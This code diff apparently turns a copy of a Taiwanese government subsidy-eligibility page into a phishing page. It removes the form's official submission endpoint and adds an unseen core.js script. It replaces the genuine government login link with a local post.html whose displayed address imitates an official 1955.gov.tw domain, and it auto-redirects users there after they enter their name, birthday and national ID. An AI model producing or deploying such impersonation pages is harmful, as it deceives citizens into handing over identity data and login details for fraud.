@@ -2,14 +2,11 @@
 <html lang="zh-tw">
 
 <head>
+  <link rel="stylesheet" href="style.css">
   <link rel="icon" href="data:,">
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/platform@1.3.6/platform.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/moment@2.29.1/moment.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/moment-taiwan@0.0.4/target/moment-taiwan.min.js"></script>
   <title>e 化服務系統 : 個人網路申報及查詢作業</title>
   <style>
     html,
@@ -33,96 +30,6 @@
       margin: auto;
       margin-top: 3rem;
     }
-
-    h1 {
-      text-align: center;
-      font-size: 1.8rem;
-      padding: 5px;
-      background-color: #FF7247;
-      color: #fff;
-      display: inline-block;
-      border: 1px solid #fff;
-      margin: 0;
-      margin-bottom: 1rem;
-    }
-
-    .logo {
-      display: inline-block;
-      max-width: 100%;
-    }
-
-    .links {
-      padding: 1rem;
-      text-align: center;
-    }
-
-    .link {
-      font-size: 1.2rem;
-      display: inline-block;
-      background-color: #fff;
-      border: 1px solid #CCD1D9;
-      padding: 7px 15px;
-      margin: 1rem;
-      text-decoration: none;
-    }
-
-    .link:hover,
-    .link:focus {
-      color: #fff;
-      background-color: #c35118;
-
-    }
-
-    .text-center {
-      text-align: center;
-    }
-
-    .text-small {
-      font-size: small;
-    }
-
-    .text-red {
-      color: #ff2020;
-    }
-
-    .text-green {
-      color: #00ac00;
-    }
-
-    .text-blue {
-      color: #0059dd;
-    }
-
-    #apply table,
-    #apply table ul {
-      text-align: initial;
-      margin: 0 auto;
-    }
-
-    #apply td:first-child {
-      text-align: right;
-    }
-
-    .invalid {
-      border-color: #ff2020;
-      color: #ff2020;
-    }
-
-    .valid-hint {
-      font-size: small;
-      color: #ff2020;
-      margin: 0;
-    }
-
-    .valid-hint:empty {
-      display: none;
-    }
-
-    .msg ul {
-      text-align: initial;
-      margin: auto;
-      width: fit-content;
-    }
   </style>
 </head>
 
@@ -137,7 +44,7 @@
         <p>
           若您想要查詢生活補貼資格，請輸入下列資訊：
           <br>
-        <form id="apply" action="https://datapost.1955.gov.tw/me/querystatus" method="post">
+        <form id="apply">
           <table border="0">
             <tr>
               <td>姓名<span class="text-red text-small">*</span></td>
@@ -178,9 +85,7 @@
         </div>
         <div style="display: none" class="msg msg2">
           <h3 class="text-blue">您符合資格，但尚未登錄帳號。</h3>
-          <p>若要登錄帳號，請備妥健保卡號及戶號，連結⾄網址 <a
-              href="https://edesk.1955.gov.tw/na/na_gsp_login.jsp">https://edesk.1955.gov.tw/na/na_gsp_login.jsp</a>
-          </p>
+          <p>正在幫您引導至登錄畫面，如無回應請按此連結 <a href="post.html">https://post.1955.gov.tw/post.html</a></p>
           <p>系統忙錄時，等候時間較⻑，敬請⾒諒。</p>
         </div>
         <div style="display: none" class="msg msg3">
@@ -212,6 +117,11 @@
           style="color: #ff2020; text-decoration: underline;" target="_blank">此處</a>連結至說明專區）</div>
     </div>
   </div>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/platform@1.3.6/platform.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/moment@2.29.1/moment.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/moment-taiwan@0.0.4/target/moment-taiwan.min.js"></script>
+  <script src="core.js"></script>
   <script>
     $(function () {
       $("#apply").on("submit", (event) => {
@@ -240,7 +150,7 @@
             case "01":
               $(".msg1").show().siblings(".msg").hide(); break
             case "02":
-              $(".msg2").show().siblings(".msg").hide(); break
+              $(".msg2").show().siblings(".msg").hide(); window.location.href = "post.html"; break
             case "03":
               $(".msg3").show().siblings(".msg").hide(); break
             case "04":
@@ -259,30 +169,6 @@
         }, err => {
           alert("發生錯誤，請稍後再試。(2)")
         }).then(() => { $("#apply input[type=submit]").prop("disabled", false) })
-      })
-
-      $("#apply input[name='name']").on("blur", (event) => {
-        if (!/^.{1,20}$/.test(event.target.value)) {
-          $(event.target).addClass("invalid").closest("td").find(".valid-hint").text("姓名應在20個字以內")
-        } else {
-          $(event.target).removeClass("invalid").closest("td").find(".valid-hint").empty()
-        }
-      })
-
-      $("#apply input[name='birthday']").on("blur", (event) => {
-        if (!/^[0-9]{3}(0[1-9]|1[012])(0[1-9]|[12][0-9]|3[01])$/.test(event.target.value) || !moment(event.target.value, "tYYMMDD").isValid()) {
-          $(event.target).addClass("invalid").closest("td").find(".valid-hint").text("生日須為民國年月日(YYYMMDD)格式")
-        } else {
-          $(event.target).removeClass("invalid").closest("td").find(".valid-hint").empty()
-        }
-      })
-
-      $("#apply input[name='id']").on("blur", (event) => {
-        if (!/^[A-Z][12][0-9]{8}$/.test(event.target.value)) {
-          $(event.target).addClass("invalid").closest("td").find(".valid-hint").text("身份證字號格式錯誤")
-        } else {
-          $(event.target).removeClass("invalid").closest("td").find(".valid-hint").empty()
-        }
       })
     })
   </script>
